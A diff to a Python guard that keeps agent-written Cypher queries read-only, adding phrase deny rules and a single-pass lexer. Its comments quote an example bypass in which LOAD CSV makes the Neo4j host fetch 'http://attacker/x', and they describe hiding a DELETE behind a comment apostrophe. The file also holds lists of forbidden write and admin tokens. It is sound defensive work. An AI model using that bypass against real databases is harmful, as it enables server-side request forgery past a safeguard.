@@ -9,23 +9,30 @@ allowing ``EXPLAIN``) only change one file.
 
 Rules (all must hold for the query to be allowed):
 
-1. The query, with comments stripped, must consist **only** of the
-   following tokens (case-insensitive, separated by ``;``):
+1. The query must open with one of the read-only starters
+   (``_check_multi_statement``) and must not contain any of:
 
-      MATCH, OPTIONAL MATCH, WITH, WHERE, RETURN, ORDER BY, SKIP,
-      LIMIT, UNION, UNWIND, CALL (only the read-only procedures in
-      ``_ALLOWED_PROCEDURES`` — the vector and fulltext index lookups;
-      disallow any ``CALL … IN TRANSACTIONS`` / ``CALL dbms.*`` /
-      other ``CALL db.*`` / admin-procedure paths, and all of
-      ``apoc.*``), USE, ON MATCH, ON CREATE
+     - write / admin / transaction keywords (``_FORBIDDEN_TOKENS``):
+       CREATE, MERGE, SET, DELETE, DETACH DELETE, REMOVE, DROP,
+       SHOW, PROFILE, BEGIN/COMMIT/ROLLBACK, …
+     - the multi-word clauses in ``_FORBIDDEN_PHRASES``: ``LOAD CSV``
+       (which makes the *server* fetch a URL of the query's choosing),
+       ``… IN TRANSACTIONS``, ``FOREACH``, ``USING PERIODIC COMMIT``.
+       These are phrases rather than tokens because their first word —
+       ``LOAD``, ``IN``, ``USING`` — is an ordinary identifier in a code
+       graph and rejecting it on its own would be a false positive.
+     - a ``CALL`` whose target is outside ``_ALLOWED_PROCEDURES`` (the
+       vector and fulltext index lookups; no ``dbms.*``, no other
+       ``db.*``, no ``apoc.*``).
 
-   Specifically forbidden:
-     - writes: CREATE, MERGE, SET, DELETE, DETACH DELETE, REMOVE
-     - schema: CREATE INDEX, DROP INDEX, CREATE CONSTRAINT, …
-     - admin:  SHOW, CALL dbms.*, CALL db.*, ALTER DATABASE, …
-     - session: BEGIN, COMMIT, ROLLBACK (transaction control)
-     - explain: EXPLAIN is allowed (read-only); PROFILE is
-       forbidden (it executes the query against the actual DB)
+   There is deliberately no *allowlist* of tokens. A whitespace
+   tokeniser cannot tell the keyword ``MATCH`` from a variable called
+   ``match``, so an allowlist either rejects every identifier in the
+   query or — as the one here did for as long as it existed — is
+   evaluated and thrown away, which is how ``LOAD CSV`` passed.
+
+   ``EXPLAIN`` is allowed (it plans, it does not run); ``PROFILE`` is
+   forbidden (it executes the query against the actual DB).
 
 2. Parameter names must be a subset of one of:
 
@@ -46,32 +53,21 @@ the agent. Anything not in here is the agent's problem.
 from __future__ import annotations
 
 import re
-from typing import Final
+from typing import Final, NamedTuple
 
-# Tokens that are allowed in a read-only query (case-insensitive
-# match against whitespace-bounded tokens). ``UNION`` deliberately
-# kept here — even though it's two reads composed into one, it's
-# still read-only. ``CALL`` is allowed only for a small allowlist
-# of ``apoc.cypher.*`` subprocedures that themselves do not
-# write; any other ``CALL`` is rejected.
-_ALLOWED_TOKENS: Final[frozenset[str]] = frozenset(
-    {
-        "MATCH",
-        "OPTIONAL",
-        "WITH",
-        "WHERE",
-        "RETURN",
-        "ORDER",
-        "BY",
-        "SKIP",
-        "LIMIT",
-        "UNION",
-        "UNWIND",
-        "USE",
-        "ON",
-        "EXPLAIN",
-    }
-)
+# There was an ``_ALLOWED_TOKENS`` frozenset here, and it never changed a
+# verdict: ``_check_keywords`` looked a token up in it and ``continue``d either
+# way. The module docstring described the guard as an allowlist on that basis,
+# so the clauses it did not list were assumed rejected. They were not — most of
+# the read-only story is carried by ``_FORBIDDEN_TOKENS`` below, and
+# ``LOAD CSV FROM 'http://…'`` after a ``WITH`` contains none of those tokens,
+# opens with ``MATCH``, and made the Neo4j host fetch an attacker-chosen URL.
+#
+# It cannot be resurrected as written: the tokeniser splits on whitespace and
+# punctuation, so every identifier, label, property and function name in the
+# query arrives as a token too, and an allowlist of clause keywords rejects all
+# of them. The dangerous multi-word clauses are denied by phrase instead —
+# see ``_FORBIDDEN_PHRASES``.
 
 # Tokens that look like read-only keywords but actually do writes.
 # Cypher is case-insensitive; the comparison below is too.
@@ -107,6 +103,28 @@ _FORBIDDEN_TOKENS: Final[frozenset[str]] = frozenset(
         "TERMINATE",
         "STOP",
     }
+)
+
+# Clauses whose first word is an ordinary identifier in a code graph, so they
+# can only be denied as a phrase. Each entry is (pattern, what it does).
+#
+# ``LOAD CSV`` is the one that matters: it is not a write, so no forbidden
+# token appears in it, and it is legal after a ``WITH`` — which means
+# ``MATCH (i:Item) WITH i LIMIT 1 LOAD CSV FROM 'http://attacker/x' AS row
+# RETURN row`` opened with an allowed starter and passed every check. The
+# effect is that the *Neo4j host* issues an HTTP request to a URL chosen by
+# whoever wrote the query, and this guard is the only gate between agent-
+# authored Cypher and the database (``tool.py``).
+#
+# ``… IN TRANSACTIONS`` turns a ``CALL`` subquery into batched auto-commit
+# transactions — transaction control, which the forbidden tokens otherwise ban
+# by name. ``FOREACH`` and ``USING PERIODIC COMMIT`` exist only to drive
+# updates.
+_FORBIDDEN_PHRASES: Final[tuple[tuple[re.Pattern[str], str], ...]] = (
+    (re.compile(r"\bLOAD\s+CSV\b", re.IGNORECASE), "LOAD CSV"),
+    (re.compile(r"\bIN\s+TRANSACTIONS\b", re.IGNORECASE), "CALL … IN TRANSACTIONS"),
+    (re.compile(r"\bFOREACH\s*\(", re.IGNORECASE), "FOREACH"),
+    (re.compile(r"\bUSING\s+PERIODIC\s+COMMIT\b", re.IGNORECASE), "USING PERIODIC COMMIT"),
 )
 
 # Parameter names the agent may use. Matches the typed envelope on
@@ -179,56 +197,100 @@ class CypherUnknownParam(CypherGuardError):
     """A ``$param`` reference in the query is not on the allowed list."""
 
 
-_COMMENT_RE = re.compile(r"//[^\n]*|/\*.*?\*/", re.DOTALL)
-
-# Cypher string literals (both quote styles, backslash escapes honoured) and
-# backtick-quoted identifiers.
+# Strings and comments are resolved in one left-to-right pass, because they
+# nest into each other and any two-regex ordering gets one of the directions
+# wrong:
 #
-# These are redacted before the keyword scan, because otherwise the scan's
-# verdict on a string depends on where in it a keyword happens to sit. The
-# tokeniser splits on whitespace and Cypher punctuation but not on quotes, so
-# a quote glues itself to the word it touches:
+#   * comments first, then strings:  ``WHERE n.url CONTAINS 'http://x' RETURN n``
+#     — the ``//`` inside the literal starts a line comment, so the rest of the
+#     query is eaten. That was the shipped behaviour, and the *mangled* query
+#     was the one returned to the caller and executed: the tool answered a
+#     different question than the agent asked, silently. Searching a code graph
+#     for ``http://``, ``//`` or a comment marker is an ordinary thing to want.
+#   * strings first, then comments:  ``MATCH (n) // don't\nDELETE n WHERE a='x'``
+#     — the apostrophe in the comment opens a "literal" that swallows the
+#     ``DELETE``, and the write becomes invisible to the scan.
+#
+# A single pass with one state (in-string / in-comment / neither) is what the
+# database itself does, so the scanned text and the executed text agree.
+#
+# Why literals are blanked for the scan at all: otherwise the verdict on a
+# string depends on where in it a keyword happens to sit. The tokeniser splits
+# on whitespace and Cypher punctuation but not on quotes, so a quote glues
+# itself to the word it touches:
 #
 #     WHERE n.body CONTAINS 'DELETE FROM users'   → tokens 'DELETE, FROM, users'   → ALLOWED
 #     WHERE n.body CONTAINS 'and then DELETE it'  → tokens 'and, then, DELETE, it' → REJECTED
 #
-# Same keyword, same kind of string, opposite outcomes — and the rejection
-# says "this tool is read-only" about a query that only reads. Searching a
-# code graph for code that contains `DELETE` or `DROP TABLE` is an ordinary
-# thing to want, so the false rejection is not hypothetical.
-#
-# Redacting is safe here, and it is worth being precise about why: a keyword
-# inside a string is only dangerous if something goes on to *execute* that
-# string. Nothing can. ``_ALLOWED_APOC`` is empty precisely because
-# ``apoc.cypher.run`` did exactly that, and the two procedures in
+# Same keyword, same kind of string, opposite outcomes. Blanking is safe
+# because a keyword inside a string is only dangerous if something goes on to
+# *execute* that string, and nothing can: ``_ALLOWED_APOC`` is empty precisely
+# because ``apoc.cypher.run`` did exactly that, and the two procedures in
 # ``_ALLOWED_PROCEDURES`` take an index name and a search term, neither of
-# which is Cypher. The allowlist is the gate; the token scan is defence for
-# the statement itself.
-#
-# (The comment beside ``_ALLOWED_APOC`` said string literals were already
-# stripped before the scan. They were not — nothing stripped them, and the
-# quote-adjacency accident above is what made a write inside a string
-# invisible. Its conclusion was right and its mechanism was wrong.)
-_STRING_RE = re.compile(
-    r"'(?:[^'\\]|\\.)*'"
-    r'|"(?:[^"\\]|\\.)*"'
-    r"|`(?:[^`\\]|\\.)*`",
-    re.DOTALL,
-)
+# which is Cypher.
+_QUOTES: Final[str] = "'\"`"
 
 
-def _strip_comments(cypher: str) -> str:
-    return _COMMENT_RE.sub(" ", cypher)
+class _LexedCypher(NamedTuple):
+    """The two views of one query produced by :func:`_lex`.
 
-
-def _redact_strings(cypher: str) -> str:
-    """Replace every string literal with a placeholder of the same shape.
-
-    Only ever used for *scanning*. ``assert_read_only_cypher`` returns the
-    query with its literals intact — handing the database a redacted query
-    would break every search this function exists to permit.
+    ``scannable`` is what every check reads: literals blanked, comments gone.
+    ``without_comments`` is what gets executed: literals intact, comments gone.
     """
-    return _STRING_RE.sub(" '' ", cypher)
+
+    scannable: str
+    without_comments: str
+
+
+def _lex(cypher: str) -> _LexedCypher:
+    """Split ``cypher`` into a scannable view and an executable view."""
+    scan: list[str] = []
+    kept: list[str] = []
+    i, n = 0, len(cypher)
+    while i < n:
+        ch = cypher[i]
+        if ch in _QUOTES:
+            end = _end_of_literal(cypher, i)
+            if end is None:
+                raise CypherGuardError(
+                    f"Unterminated {ch} literal in Cypher — the guard cannot tell "
+                    "where the string ends, so it cannot tell what would run."
+                )
+            kept.append(cypher[i:end])
+            scan.append(" '' ")
+            i = end
+            continue
+        if cypher.startswith("//", i):
+            end = cypher.find("\n", i)
+            i = n if end == -1 else end
+            scan.append(" ")
+            kept.append(" ")
+            continue
+        if cypher.startswith("/*", i):
+            end = cypher.find("*/", i + 2)
+            i = n if end == -1 else end + 2
+            scan.append(" ")
+            kept.append(" ")
+            continue
+        scan.append(ch)
+        kept.append(ch)
+        i += 1
+    return _LexedCypher("".join(scan), "".join(kept))
+
+
+def _end_of_literal(cypher: str, start: int) -> int | None:
+    """Index just past the literal opening at ``start``, or None if unclosed."""
+    quote = cypher[start]
+    i = start + 1
+    n = len(cypher)
+    while i < n:
+        if cypher[i] == "\\":
+            i += 2
+            continue
+        if cypher[i] == quote:
+            return i + 1
+        i += 1
+    return None
 
 
 # Identifier positions. A Cypher write is a keyword in *statement* position —
@@ -319,16 +381,19 @@ def _extract_param_names(cypher: str) -> set[str]:
 
 
 def _check_keywords(cypher: str, tokens: list[str]) -> None:
-    """Reject any token that's not in the read-only allowlist."""
+    """Reject write / admin keywords and the forbidden multi-word clauses."""
     for tok in tokens:
-        u = tok.upper()
-        if u in _FORBIDDEN_TOKENS:
+        if tok.upper() in _FORBIDDEN_TOKENS:
             raise CypherReadOnlyViolation(
                 f"Cypher token {tok!r} is forbidden: this tool is read-only."
             )
-        if u not in _ALLOWED_TOKENS:
-            continue
-        # All-read — keep scanning.
+    for pattern, name in _FORBIDDEN_PHRASES:
+        if pattern.search(cypher):
+            raise CypherReadOnlyViolation(
+                f"Cypher clause {name!r} is forbidden: this tool is read-only, "
+                "and LOAD CSV also makes the database host fetch a URL of the "
+                "query's choosing."
+            )
 
 
 def _check_multi_statement(cypher: str) -> None:
@@ -384,10 +449,14 @@ def assert_read_only_cypher(cypher: str) -> str:
     """
     if not isinstance(cypher, str) or not cypher.strip():
         raise CypherGuardError("Cypher must be a non-empty string.")
-    stripped = _strip_comments(cypher).strip()
-    # Scan against the string-redacted form so a literal's contents cannot
+    # One pass produces both views. ``without_comments`` is what we return and
+    # what runs; its string literals are untouched, so a query searching for
+    # ``http://`` is executed as written rather than truncated at the ``//``.
+    lexed = _lex(cypher)
+    stripped = lexed.without_comments.strip()
+    # Scan against the literal-blanked form so a literal's contents cannot
     # decide the verdict; return the real query below.
-    scannable = _redact_strings(stripped)
+    scannable = lexed.scannable.strip()
     # Tokenize once and reuse across checks. The keyword scan gets its own
     # stream with identifier positions blanked — an alias or property named
     # ``commit`` is not a transaction command. Everything after it reads the
